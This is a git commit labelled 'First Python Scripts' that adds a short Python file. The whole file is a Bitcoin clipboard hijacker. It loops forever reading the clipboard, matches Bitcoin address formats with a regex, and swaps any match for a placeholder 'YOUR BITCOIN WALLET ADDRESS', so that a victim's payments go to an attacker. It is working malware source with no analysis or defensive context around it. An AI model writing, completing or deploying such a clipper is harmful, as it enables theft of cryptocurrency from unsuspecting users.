edb5a0b9a44cec97568659b1c10deb6ef440b059
GameHQ702 <tutorialhq702@gmail.com>
2020-05-21 21:10:29 +0200

    First Python Scripts

---
+++ Python/main.py
@@ -0,0 +1,16 @@
+#
+# Console Application, can be seen
+#
+import re
+import pyperclip
+
+regex = r"\b((bc|tb)(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|([13]|[mn2])[a-km-zA-HJ-NP-Z1-9]{25,39})\b"
+
+def btc_clipper(data):
+     if re.match(r"\b((bc|tb)(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|([13]|[mn2])[a-km-zA-HJ-NP-Z1-9]{25,39})\b", data):
+        pyperclip.copy("YOUR BITCOIN WALLET ADDRESS")
+
+while True:
+    data = pyperclip.paste()
+    if data != "None":
+        btc_clipper(data)
